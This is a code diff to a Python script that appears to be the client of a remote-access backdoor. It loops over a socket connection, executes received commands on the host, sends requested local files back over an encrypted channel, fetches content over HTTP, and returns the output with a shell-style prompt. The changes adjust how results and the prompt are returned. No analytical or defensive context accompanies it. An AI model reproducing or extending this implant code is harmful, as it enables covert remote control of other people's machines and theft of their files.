@@ -21,7 +21,7 @@ def upload(sock, fn):
     d = f.read()
     f.close()
     Send(sock, cipher, d, fn)
-    ret = None
+    return True
   except Exception as e:
     return str(e) + ' ⚠️'
 
@@ -53,12 +53,12 @@ def run(s):
   else:
     return err.decode()
 
-def res(prev=None):
+def res(ret):
   global cwd
-  if prev:
-    return prev + '\n' + cwd + '>'
-  else:
+  if ret == '':
     return cwd + '>'
+  else:
+    return ret + '\n' + cwd + '>'
 
 while True:
   try:
@@ -81,9 +81,11 @@ while True:
 
     if type(data) == str:
       if data.startswith('dl '):
-        ret = upload(sock, data[3:].strip())
+        ret = upload(sock, data[3:])
+        if ret == True:
+          continue
       elif data.startswith('dlhttp '):
-        ret = dlhttp(sock, data[7:].strip())
+        ret = dlhttp(sock, data[7:])
       else:
         ret = run(data)
     else:
@@ -95,5 +97,4 @@ while True:
       except Exception as e:
         ret = str(e) + ' ⚠️'
 
-    if ret != None:
-      Send(sock, cipher, res(ret))
+    Send(sock, cipher, res(ret))
